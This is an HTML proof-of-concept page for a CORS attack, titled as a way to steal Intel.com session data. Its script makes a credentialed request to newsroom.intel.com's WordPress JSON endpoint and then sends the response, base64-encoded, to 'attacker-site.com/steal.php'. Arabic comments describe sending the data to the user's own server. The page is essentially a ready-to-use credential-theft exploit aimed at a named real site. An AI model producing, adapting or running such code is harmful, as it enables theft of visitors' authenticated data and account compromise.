<!DOCTYPE html>

  <title>CORS Exploit PoC – Steal Intel.com Session</title>
</head>
<body>
  <h1>CORS Exploit PoC – Steal Intel.com Session</h1>
  <button onclick="exploit()">Click to Exploit</button>

  <script>
    function exploit() {
      fetch("https://newsroom.intel.com/wp-json/", {
        method: "GET",
        credentials: "include"
      })
      .then(response => response.text())
      .then(data => {
        // طباعة البيانات في console (أو إرسالها لموقعك)
        console.log("Intel.com response:", data);

        // إرسالها لسيرفر المهاجم (اختياري لو حبيت)
        fetch("https://attacker-site.com/steal.php?data=" + btoa(data));
      })
      .catch(error => {
        console.error("Exploit failed", error);
      });
    }
  </script>
